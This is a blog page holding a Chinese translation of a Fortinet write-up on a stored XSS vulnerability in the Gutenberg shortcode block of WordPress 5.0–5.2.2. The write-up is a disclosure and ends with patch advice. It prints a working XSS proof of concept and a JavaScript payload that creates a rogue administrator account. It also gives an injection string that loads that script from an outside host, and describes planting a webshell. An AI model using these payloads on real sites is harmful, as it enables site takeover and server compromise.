<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head><meta name="generator" content="Hexo 3.8.0">

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">

    <!--Description-->
    
        <meta name="description" content="译文声明本文是翻译文章，文章原作者fortinet，文章来源：fortinet.com原文地址：https://www.fortinet.com/blog/threat-research/wordpress-core-stored-xss-vulnerability.html译文仅供参考，具体内容表">
    

    <!--Author-->
    
        <meta name="author" content="JYP">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="WordPress存储型XSS漏洞分析">
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="ALL BLUE">

    <!--Page Cover-->
    
        <meta property="og:image" content>
    

    <!-- Title -->
    
    <title>WordPress存储型XSS漏洞分析 - ALL BLUE</title>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/reset.css">
    <link rel="stylesheet" href="/css/main.css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdn.rawgit.com/noelboss/featherlight/1.3.5/release/featherlight.min.css" type="text/css" rel="stylesheet">

    <!-- Google Analytics -->
    


    <!--Favicon-->
    

</head>

<body>

<!-- Menu -->
<!-- Navigation -->
<header>
    <div class="logo">
        <a href="/">ALL BLUE</a>
    </div><!-- end logo -->

    <div id="menu_icon"></div>
    <nav>
        <ul>
            
            <li>
                <a href="/">Home</a>
            </li>
            
            <li>
                <a href="/archives">Archives</a>
            </li>
            
        </ul>
    </nav><!-- end navigation menu -->

    <div class="footer clearfix">
        <ul class="social clearfix">
            
            
                <li><a href="https://www.facebook.com/" class="fb" target="_blank" data-title="Facebook"></a></li>
            
            
                <li><a href="https://www.behance.net/" class="behance" target="_blank" data-title="Behance"></a></li>
            
            
                <li><a href="https://plus.google.com/+Pixelhint/posts" class="google" target="_blank" data-title="Google+"></a></li>
            
            
                <li><a href="https://dribbble.com/pixelhint" class="dribble" target="_blank" data-title="Dribble"></a></li>
            
            
            
            
        </ul><!-- end social -->

        <div class="rights">
            <p>Copyright © 2014 magnetic.</p>
            <p>Template by <a href="http://pixelhint.com/magnetic-free-html5-responsive-photography-website-template/">Pixelhint.com</a></p>
            <p>Hexo Theme by <a href="http://www.codeblocq.com/">Jonathan K.</a></p>
        </div><!-- end rights -->
    </div><!-- end footer -->
</header><!-- end header -->


<!-- Main Content -->
<section class="main clearfix">

    <section class="top" style="background: url('http://placehold.it/1300x500');">
        <div class="wrapper content_header clearfix">
            

<div class="work_nav">

    <ul class="btn clearfix">
        
        <li><a href="/2019/12/07/漏洞搜集/犀牛(RhinOS)CMS3.X任意文件下载漏洞(CVE-2018-18760)/" class="previous" data-title="犀牛(RhinOS)CMS3.X任意文件下载漏洞(CVE-2018-18760)"></a></li>
        
        <li><a href="/" class="grid" data-title="Portfolio"></a></li>
        
        <li><a href="/2019/12/07/漏洞搜集/cve-20190-0708/" class="next" data-title="简单判断是否是cve-2019-0..."></a></li>
        
    </ul>

</div><!-- end work_nav -->
            <h1 class="title">WordPress存储型XSS漏洞分析</h1>
        </div>
    </section><!-- end top -->

    <section class="wrapper">
        <div class="content">

            <!-- Gallery -->
            

            <!-- Content -->
            <p><strong>译文声明<br>本文是翻译文章，文章原作者fortinet，文章来源：fortinet.com<br>原文地址：<a href="https://www.fortinet.com/blog/threat-research/wordpress-core-stored-xss-vulnerability.html" target="_blank" rel="noopener">https://www.fortinet.com/blog/threat-research/wordpress-core-stored-xss-vulnerability.html</a><br>译文仅供参考，具体内容表达以及含义原文为准</strong></p>
<p><img src="https://p3.ssl.qhimg.com/t0154214347380ba2a2.png" alt> </p>
<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>WordPress是世界上最流行的CMS（内容管理系统），占据全球60.4%的市场份额，这个数字远远高于第二名的Joomla!（5.2%的市场份额）。因此，在互联网上有超过三分之一的网站采用WordPress构建。</p>
<p>FortiGuard Labs团队最近在WordPress中发现了一个存储型XSS（Cross-Site Scripting）0day漏洞，这个XSS漏洞位于WordPress 5.0新增的Gutenberg编辑器中，该编辑器无法正确过滤Shortcode（短代码）错误消息中的JavaScript/HTML代码。如果远程攻击者具备Contributor（贡献者）或者更高权限，当受害者访问被攻击的网页时，攻击者就可以在受害者浏览器上下文中执行任意JavaScript/HTML代码。如果受害者具备更高权限（比如管理员权限），攻击者甚至可以攻破整个web服务器。</p>
<p>这个存储型XSS漏洞影响5.0至5.2.2版的WordPress。</p>
<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>在WordPress 5.0中，用户可以在文章（post）中添加Shortcode块（block）。当在Shortcode块中添加特定的HTML编码字符（比如&lt;）然后重新打开该文章时，WordPress就会显示一个错误消息，将&lt;解码成&lt;然后展示预览。</p>
<p><img src="https://p5.ssl.qhimg.com/t018c8ac1b86a6e22ac.png" alt><br>图1. 在Shortcode块中插入HTML编码字符</p>
<p><img src="https://p1.ssl.qhimg.com/t0113d0da196199b259.png" alt><br>图2. Shortcode错误消息预览</p>
<p>我们可以使用<strong>“&gt;&lt;img src=1 onerror=prompt(1)&gt;</strong>这段PoC代码轻松绕过预览视图中的XSS过滤器。</p>
<p><img src="https://p1.ssl.qhimg.com/t0113d0da196199b259.png" alt><br>图3. 将PoC代码插入Shortcode块</p>
<p>当受害者查看该文章时，就会在浏览器中执行XSS代码。</p>
<p><img src="https://p3.ssl.qhimg.com/t010226398ebf02fdd8.png" alt><br>图4. WordPress Shortcode预览XSS</p>
<p>如果受害者刚好具备管理员权限，那么攻击者就可以利用该漏洞来获取管理员账户的控制权，利用WordPress内置的函数拿到shell，进一步控制整个服务器。</p>
<p>比如，攻击者可以在自己的web服务器上托管一个JavaScript文件（这里以wpaddadmin.js为例），这段JavaScript代码会添加一个WordPress管理员账户，用户名为attack，密码为attack。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// Send a GET request to the URL &apos;/wordpress/wp-admin/user-new.php&apos;, and extract the current &apos;nonce&apos; value  </span><br><span class="line">var ajaxRequest = new XMLHttpRequest();  </span><br><span class="line">var requestURL = &quot;/wordpress/wp-admin/user-new.php&quot;;  </span><br><span class="line">var nonceRegex = /ser&quot; value=&quot;([^&quot;]*?)&quot;/g;  </span><br><span class="line">ajaxRequest.open(&quot;GET&quot;, requestURL, false);  </span><br><span class="line">ajaxRequest.send();  </span><br><span class="line">var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);  </span><br><span class="line">var nonce = nonceMatch[1];  </span><br><span class="line"></span><br><span class="line">// Construct a POST query, using the previously extracted &apos;nonce&apos; value, and create a new user with an arbitrary username / password, as an Administrator  </span><br><span class="line">var params = &quot;action=createuser&amp;_wpnonce_create-user=&quot;+nonce+&quot;&amp;user_login=attacker&amp;email=attacker@site.com&amp;pass1=attacker&amp;pass2=attacker&amp;role=administrator&quot;;  </span><br><span class="line">ajaxRequest = new XMLHttpRequest();  </span><br><span class="line">ajaxRequest.open(&quot;POST&quot;, requestURL, true);  </span><br><span class="line">ajaxRequest.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);  </span><br><span class="line">ajaxRequest.send(params);</span><br></pre></td></tr></table></figure>
<p>然后攻击者可以使用如下PoC来插入JavaScript。</p>
<p><code>&quot;&amp;gt;&amp;lt;img src=1 onerror=&quot;javascript&amp;colon;(function () { var url = &#39;http://aaa.bbb.ccc.ddd/ wpaddadmin.js&#39;;if (typeof beef == &#39;undefined&#39;) { var bf = document.createElement(&#39;script&#39;); bf.type = &#39;text/javascript&#39;; bf.src = url; document.body.appendChild(bf);}})();&quot;&amp;gt;</code><br><img src="https://p3.ssl.qhimg.com/t01ff29771459e602b0.png" alt><br>图5. 插入XSS代码以添加管理员账户</p>
<p>一旦具备高权限的受害者查看该文章，就会创建attacker管理员账户。<br><img src="https://p4.ssl.qhimg.com/t010e42abaa7fcc8d89.png" alt><br>图6. 执行XSS代码</p>
<p><img src="https://p4.ssl.qhimg.com/t013e0fbc54e4f4a6c4.png" alt><br>图7. XSS代码成功创建具备管理员权限的attacker账户</p>
<p>随后攻击者可以修改已有的php文件，改成webshell代码，以便接管目标web服务器。</p>
<p><img src="https://p0.ssl.qhimg.com/t0131da4b3ea2ca7c86.png" alt></p>
<p>图8. 使用攻击者账户添加webshell</p>
<p><img src="https://p1.ssl.qhimg.com/t01c0b5cda440e3cf4b.png" alt><br>图9. 控制web服务器</p>
<h2 id="0x02-解决方案"><a href="#0x02-解决方案" class="headerlink" title="0x02 解决方案"></a>0x02 解决方案</h2><p>FortiGuard Labs向WordPress反馈了这个0day漏洞，官方很快发布了相应补丁。如果大家正在使用存在漏洞的WordPress版本，请尽快升级到最新版，或者及时打上补丁。</p>


            <!-- Tags -->
            


<div class="tags">
    
</div>



            <!-- Comments -->
            <div>
                




            </div>
        </div><!-- end content -->
    </section>
</section><!-- end main -->

<!-- After footer scripts -->

<!-- jQuery -->
<script src="/js/jquery.js"></script>

<!-- Custom Code -->
<script src="/js/main.js"></script>

<!-- Gallery -->
<script src="//cdn.rawgit.com/noelboss/featherlight/1.3.5/release/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Disqus Comments -->


<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>